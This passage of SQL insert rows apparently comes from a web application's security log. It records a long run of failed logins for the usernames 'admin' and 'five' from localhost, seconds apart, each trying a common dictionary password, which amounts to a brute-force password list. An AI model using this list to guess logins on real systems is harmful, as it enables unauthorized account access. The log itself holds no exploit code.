(378, 'WARNING_AUTH_NOT_SUCCESS', 'admin, Test, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522066),
(379, 'WARNING_AUTH_NOT_SUCCESS', 'admin, Welcome1, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522067),
(380, 'WARNING_AUTH_NOT_SUCCESS', 'admin, [EMPTY PASSWORD], RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522068),
(381, 'WARNING_AUTH_NOT_SUCCESS', 'admin, aaaaaa, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522070),
(382, 'WARNING_AUTH_NOT_SUCCESS', 'admin, abc123, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522071),
(383, 'WARNING_AUTH_NOT_SUCCESS', 'admin, abcd1234, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522072),
(384, 'WARNING_AUTH_NOT_SUCCESS', 'admin, admin, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522074),
(385, 'WARNING_AUTH_NOT_SUCCESS', 'admin, admin123, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522075),
(386, 'WARNING_AUTH_NOT_SUCCESS', 'admin, alpha1906, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522076),
(387, 'WARNING_AUTH_NOT_SUCCESS', 'admin, andrea, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522078),
(388, 'WARNING_AUTH_NOT_SUCCESS', 'admin, asdasd, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522079),
(389, 'WARNING_AUTH_NOT_SUCCESS', 'admin, asdfghjkl, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522081),
(390, 'WARNING_AUTH_NOT_SUCCESS', 'admin, barcelona, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522082),
(391, 'WARNING_AUTH_NOT_SUCCESS', 'admin, cecelle222, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522084),
(392, 'WARNING_AUTH_NOT_SUCCESS', 'admin, changeme, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522085),
(393, 'WARNING_AUTH_NOT_SUCCESS', 'admin, cl4.r0ut3r, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522087),
(394, 'WARNING_AUTH_NOT_SUCCESS', 'admin, crs, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522088),
(395, 'WARNING_AUTH_NOT_SUCCESS', 'admin, daniel, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522090),
(396, 'WARNING_AUTH_NOT_SUCCESS', 'admin, demo, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522091),
(397, 'WARNING_AUTH_NOT_SUCCESS', 'admin, gati07, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522092),
(398, 'WARNING_AUTH_NOT_SUCCESS', 'admin, guest, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522094),
(399, 'WARNING_AUTH_NOT_SUCCESS', 'admin, iamawesome, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522095),
(400, 'WARNING_AUTH_NOT_SUCCESS', 'admin, iloveu1362, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522097),
(401, 'WARNING_AUTH_NOT_SUCCESS', 'admin, iloveyou, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522098),
(402, 'WARNING_AUTH_NOT_SUCCESS', 'admin, internet, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522099),
(403, 'WARNING_AUTH_NOT_SUCCESS', 'admin, iz85917031, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522101),
(404, 'WARNING_AUTH_NOT_SUCCESS', 'admin, jackmark456, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522102),
(405, 'WARNING_AUTH_NOT_SUCCESS', 'admin, jimmy098, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522103),
(406, 'WARNING_AUTH_NOT_SUCCESS', 'admin, jimmy123, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522105),
(407, 'WARNING_AUTH_NOT_SUCCESS', 'admin, justaddwater, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522106),
(408, 'WARNING_AUTH_NOT_SUCCESS', 'admin, kbctyjr, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522107),
(409, 'WARNING_AUTH_NOT_SUCCESS', 'admin, master, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522109),
(410, 'WARNING_AUTH_NOT_SUCCESS', 'admin, michelle, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522110),
(411, 'WARNING_AUTH_NOT_SUCCESS', 'admin, mpmstas,,11, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522112),
(412, 'WARNING_AUTH_NOT_SUCCESS', 'admin, mustang, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522113),
(413, 'WARNING_AUTH_NOT_SUCCESS', 'admin, oktober83, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522114),
(414, 'WARNING_AUTH_NOT_SUCCESS', 'admin, omgponies, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522116),
(415, 'WARNING_AUTH_NOT_SUCCESS', 'admin, parola, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522117),
(416, 'WARNING_AUTH_NOT_SUCCESS', 'admin, pass, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522118),
(417, 'WARNING_AUTH_NOT_SUCCESS', 'admin, password, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522120),
(418, 'WARNING_AUTH_NOT_SUCCESS', 'admin, password1, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522121),
(419, 'WARNING_AUTH_NOT_SUCCESS', 'admin, princess, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522122),
(420, 'WARNING_AUTH_NOT_SUCCESS', 'admin, q1w2e3r4, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522124),
(421, 'WARNING_AUTH_NOT_SUCCESS', 'admin, qazwsx, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522125),
(422, 'WARNING_AUTH_NOT_SUCCESS', 'admin, qwerty, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522126),
(423, 'WARNING_AUTH_NOT_SUCCESS', 'admin, qwerty123, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522128),
(424, 'WARNING_AUTH_NOT_SUCCESS', 'admin, qwertyuiop, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522129),
(425, 'WARNING_AUTH_NOT_SUCCESS', 'admin, realbetis07, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522131),
(426, 'WARNING_AUTH_NOT_SUCCESS', 'admin, root, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522132),
(427, 'WARNING_AUTH_NOT_SUCCESS', 'admin, samsung, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522133),
(428, 'WARNING_AUTH_NOT_SUCCESS', 'admin, sergio80, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522135),
(429, 'WARNING_AUTH_NOT_SUCCESS', 'admin, shadow, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522136),
(430, 'WARNING_AUTH_NOT_SUCCESS', 'admin, spoofyou2015, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522137),
(431, 'WARNING_AUTH_NOT_SUCCESS', 'admin, student, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522139),
(432, 'WARNING_AUTH_NOT_SUCCESS', 'admin, sunshine, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522140),
(433, 'WARNING_AUTH_NOT_SUCCESS', 'admin, test, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522141),
(434, 'WARNING_AUTH_NOT_SUCCESS', 'admin, ubnt, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522143),
(435, 'WARNING_AUTH_NOT_SUCCESS', 'admin, user, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522144),
(436, 'WARNING_AUTH_NOT_SUCCESS', 'admin, welcome, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522145),
(437, 'WARNING_AUTH_NOT_SUCCESS', 'admin, welcome1, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522147),
(438, 'WARNING_AUTH_NOT_SUCCESS', 'admin, zonnetje, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522148),
(439, 'WARNING_AUTH_NOT_SUCCESS', 'admin, zxcvbnm, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522150),
(440, 'WARNING_AUTH_NOT_SUCCESS', 'five, ******, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522151),
(441, 'WARNING_AUTH_NOT_SUCCESS', 'five, *******, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522153),
(442, 'WARNING_AUTH_NOT_SUCCESS', 'five, ********, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522154),
(443, 'WARNING_AUTH_NOT_SUCCESS', 'five, *********, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522155),
(444, 'WARNING_AUTH_NOT_SUCCESS', 'five, **********, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522157),
(445, 'WARNING_AUTH_NOT_SUCCESS', 'five, 0, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522158),
(446, 'WARNING_AUTH_NOT_SUCCESS', 'five, 0000, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522159),
(447, 'WARNING_AUTH_NOT_SUCCESS', 'five, 000000, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522161),
(448, 'WARNING_AUTH_NOT_SUCCESS', 'five, 00000000, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522162),
(449, 'WARNING_AUTH_NOT_SUCCESS', 'five, 0123456789, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522163),
(450, 'WARNING_AUTH_NOT_SUCCESS', 'five, 0987654321, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522165),
(451, 'WARNING_AUTH_NOT_SUCCESS', 'five, 1, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522166),
(452, 'WARNING_AUTH_NOT_SUCCESS', 'five, 102030, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522168),
(453, 'WARNING_AUTH_NOT_SUCCESS', 'five, 1111, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522169),
(454, 'WARNING_AUTH_NOT_SUCCESS', 'five, 11111, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522170),
(455, 'WARNING_AUTH_NOT_SUCCESS', 'five, 111111, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522172),
(456, 'WARNING_AUTH_NOT_SUCCESS', 'five, 11111111, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522173),
(457, 'WARNING_AUTH_NOT_SUCCESS', 'five, 112233, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522175),
(458, 'WARNING_AUTH_NOT_SUCCESS', 'five, 1128, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522176),
(459, 'WARNING_AUTH_NOT_SUCCESS', 'five, 121212, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522177),
(460, 'WARNING_AUTH_NOT_SUCCESS', 'five, 123, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522179),
(461, 'WARNING_AUTH_NOT_SUCCESS', 'five, 123123, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522180),
(462, 'WARNING_AUTH_NOT_SUCCESS', 'five, 123123123, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522182),
(463, 'WARNING_AUTH_NOT_SUCCESS', 'five, 123321, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522183),
(464, 'WARNING_AUTH_NOT_SUCCESS', 'five, 1234, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522185),
(465, 'WARNING_AUTH_NOT_SUCCESS', 'five, 12341234, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522186),
(466, 'WARNING_AUTH_NOT_SUCCESS', 'five, 12345, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522188),
(467, 'WARNING_AUTH_NOT_SUCCESS', 'five, 123456, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522189),
(468, 'WARNING_AUTH_NOT_SUCCESS', 'five, 1234567, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522190),
(469, 'WARNING_AUTH_NOT_SUCCESS', 'five, 12345678, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522192),
(470, 'WARNING_AUTH_NOT_SUCCESS', 'five, 123456789, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522193),
(471, 'WARNING_AUTH_NOT_SUCCESS', 'five, 1234567890, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522194),
(472, 'WARNING_AUTH_NOT_SUCCESS', 'five, 1234qwer, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522196),
(473, 'WARNING_AUTH_NOT_SUCCESS', 'five, 123654, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522197),
(474, 'WARNING_AUTH_NOT_SUCCESS', 'five, 123abc, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522199),
(475, 'WARNING_AUTH_NOT_SUCCESS', 'five, 123qwe, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522200),
(476, 'WARNING_AUTH_NOT_SUCCESS', 'five, 159357, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522201),
(477, 'WARNING_AUTH_NOT_SUCCESS', 'five, 159753, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522203),
(478, 'WARNING_AUTH_NOT_SUCCESS', 'five, 19731973, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522204),
(479, 'WARNING_AUTH_NOT_SUCCESS', 'five, 1q2w3e, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522205),
(480, 'WARNING_AUTH_NOT_SUCCESS', 'five, 1q2w3e4r, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522207),
(481, 'WARNING_AUTH_NOT_SUCCESS', 'five, 1q2w3e4r5t, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522208),
(482, 'WARNING_AUTH_NOT_SUCCESS', 'five, 1qaz2wsx, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522209),
(483, 'WARNING_AUTH_NOT_SUCCESS', 'five, 222222, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522211),
(484, 'WARNING_AUTH_NOT_SUCCESS', 'five, 42Olympia, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522212),
(485, 'WARNING_AUTH_NOT_SUCCESS', 'five, 4uA7d0A1, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522214),
(486, 'WARNING_AUTH_NOT_SUCCESS', 'five, 4uA7d0B2, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522215),
(487, 'WARNING_AUTH_NOT_SUCCESS', 'five, 555555, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522217),
(488, 'WARNING_AUTH_NOT_SUCCESS', 'five, 654321, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522218),
(489, 'WARNING_AUTH_NOT_SUCCESS', 'five, 666666, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522219),
(490, 'WARNING_AUTH_NOT_SUCCESS', 'five, 777777, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522221),
(491, 'WARNING_AUTH_NOT_SUCCESS', 'five, 7777777, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522222),
(492, 'WARNING_AUTH_NOT_SUCCESS', 'five, 888888, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522223),
(493, 'WARNING_AUTH_NOT_SUCCESS', 'five, 88888888, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522225),
(494, 'WARNING_AUTH_NOT_SUCCESS', 'five, 8WI5Hlbww*Q%, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522226),
(495, 'WARNING_AUTH_NOT_SUCCESS', 'five, 97cCm#, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522228),
(496, 'WARNING_AUTH_NOT_SUCCESS', 'five, 987654, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522229),
(497, 'WARNING_AUTH_NOT_SUCCESS', 'five, 987654321, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522230),
(498, 'WARNING_AUTH_NOT_SUCCESS', 'five, 999999, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522232),
(499, 'WARNING_AUTH_NOT_SUCCESS', 'five, ??????, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522233),
(500, 'WARNING_AUTH_NOT_SUCCESS', 'five, ???????, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522234),
(501, 'WARNING_AUTH_NOT_SUCCESS', 'five, ????????, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522236),
(502, 'WARNING_AUTH_NOT_SUCCESS', 'five, ?????????, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522237),
(503, 'WARNING_AUTH_NOT_SUCCESS', 'five, BALANDAS, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522238),
(504, 'WARNING_AUTH_NOT_SUCCESS', 'five, Cannot Decrypt, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522240),
(505, 'WARNING_AUTH_NOT_SUCCESS', 'five, Caroline123@, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522241),
(506, 'WARNING_AUTH_NOT_SUCCESS', 'five, Dr%*iKm, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522242),
(507, 'WARNING_AUTH_NOT_SUCCESS', 'five, Every1Out, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522244),
(508, 'WARNING_AUTH_NOT_SUCCESS', 'five, FTpdo24#, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522245),
(509, 'WARNING_AUTH_NOT_SUCCESS', 'five, Ghj124$(), RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522247),
(510, 'WARNING_AUTH_NOT_SUCCESS', 'five, HowMuchIsTheFish, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522248),
(511, 'WARNING_AUTH_NOT_SUCCESS', 'five, Hwa303859, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522249),
(512, 'WARNING_AUTH_NOT_SUCCESS', 'five, Karend22, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522251),
(513, 'WARNING_AUTH_NOT_SUCCESS', 'five, LogMeIn, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522252),
(514, 'WARNING_AUTH_NOT_SUCCESS', 'five, No Data!, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522253),
(515, 'WARNING_AUTH_NOT_SUCCESS', 'five, Note:, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522255),
(516, 'WARNING_AUTH_NOT_SUCCESS', 'five, P@ssw0rd, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522256),
